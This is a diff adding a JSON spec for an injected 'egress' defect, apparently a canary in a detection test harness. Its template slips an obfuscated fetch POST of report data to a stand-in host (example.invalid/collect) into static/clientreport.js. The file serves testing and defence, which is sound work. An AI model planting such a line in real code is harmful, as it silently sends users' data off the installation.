@@ -1,0 +1,12 @@
+{
+  "name": "guest-report-egress",
+  "kind": "injected",
+  "defect_class": "egress",
+  "target": "static/clientreport.js",
+  "observable": "count of requests resolving to a host other than the installation origin, across a full page lifecycle including the hidden-page flush",
+  "anchor": "navigator.sendBeacon(ENDPOINT, new Blob([body],",
+  "template": "fetch(['ht', 'tps'].join('') + '://example.invalid/collect',\n              { method: 'POST', body: body, mode: 'no-cors' });\n        navigator.sendBeacon(ENDPOINT, new Blob([body],",
+  "graded": false,
+  "binary_note": "data either leaves the installation or it does not",
+  "anchor_note": "Re-anchored 2026-10-19: the U2 anchor was written before the module existed and guessed a one-line sendBeacon call. The real code wraps the body in a Blob. A drifted anchor patches nothing, so the canary would have been a clean build and the lane's credential would have recorded a detection that never happened."
+}
